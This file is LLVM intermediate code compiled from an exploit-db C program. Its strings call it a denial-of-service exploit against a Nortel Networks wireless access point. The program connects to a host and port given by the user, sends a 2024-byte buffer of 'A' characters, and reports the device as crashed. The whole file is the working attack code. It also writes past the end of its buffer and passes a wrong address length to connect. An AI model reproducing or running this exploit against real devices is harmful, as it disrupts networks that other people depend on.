; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_23786.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_23786.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.in_addr }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [53 x i8] c"\0AWLAN NortelNetworks AP DoS exploit by Mark Ludwik\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"Usage: WlanDoS [AP/Host] [port]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"Couldn't resolve %s!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"[+] Exploit buffer.\0A\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"\0A\0A\0A\0A\0A\0A\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"connect()\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"[+] Connected...\0A\00", align 1
@.str.8 = private unnamed_addr constant [28 x i8] c"[+] Sending DoS attack...!\0A\00", align 1
@.str.9 = private unnamed_addr constant [29 x i8] c"\0A[+] Crash was successful !\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2024 x i8], align 16
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %10, 3
  br i1 %11, label %12, label %16

12:                                               ; preds = %2
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 @exit(i32 -1) #4
  unreachable

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call %struct.hostent* @gethostbyname(i8* %19)
  store %struct.hostent* %20, %struct.hostent** %9, align 8
  %21 = icmp eq %struct.hostent* %20, null
  br i1 %21, label %22, label %28

22:                                               ; preds = %16
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %25)
  %27 = call i32 @exit(i32 -1) #4
  unreachable

28:                                               ; preds = %16
  %29 = load i32, i32* @AF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = call i32 @socket(i32 %29, i32 %30, i32 0)
  store i32 %31, i32* %6, align 4
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %36

33:                                               ; preds = %28
  %34 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %35 = call i32 @exit(i32 -1) #4
  unreachable

36:                                               ; preds = %28
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %39 = load %struct.hostent*, %struct.hostent** %9, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = inttoptr i64 %41 to %struct.in_addr*
  %43 = bitcast %struct.in_addr* %38 to i8*
  %44 = bitcast %struct.in_addr* %42 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %43, i8* align 4 %44, i64 4, i1 false)
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @atoi(i8* %47)
  %49 = call i32 @htons(i32 %48)
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %49, i32* %50, align 4
  %51 = load i32, i32* @AF_INET, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %51, i32* %52, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %54 = getelementptr inbounds [2024 x i8], [2024 x i8]* %7, i64 0, i64 0
  %55 = call i32 @memset(i8* %54, i8 signext 65, i32 2024)
  %56 = getelementptr inbounds [2024 x i8], [2024 x i8]* %7, i64 0, i64 0
  %57 = getelementptr inbounds i8, i8* %56, i64 2024
  %58 = call i32 @memcpy(i8* %57, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0), i32 8)
  %59 = load i32, i32* %6, align 4
  %60 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %61 = call i32 @connect(i32 %59, %struct.sockaddr* %60, i32 4)
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %66

63:                                               ; preds = %36
  %64 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %65 = call i32 @exit(i32 -1) #4
  unreachable

66:                                               ; preds = %36
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.8, i64 0, i64 0))
  %69 = load i32, i32* %6, align 4
  %70 = getelementptr inbounds [2024 x i8], [2024 x i8]* %7, i64 0, i64 0
  %71 = getelementptr inbounds [2024 x i8], [2024 x i8]* %7, i64 0, i64 0
  %72 = call i32 @strlen(i8* %71)
  %73 = call i32 @send(i32 %69, i8* %70, i32 %72, i32 0)
  %74 = call i32 @sleep(i32 2)
  %75 = load i32, i32* %6, align 4
  %76 = call i32 @close(i32 %75)
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
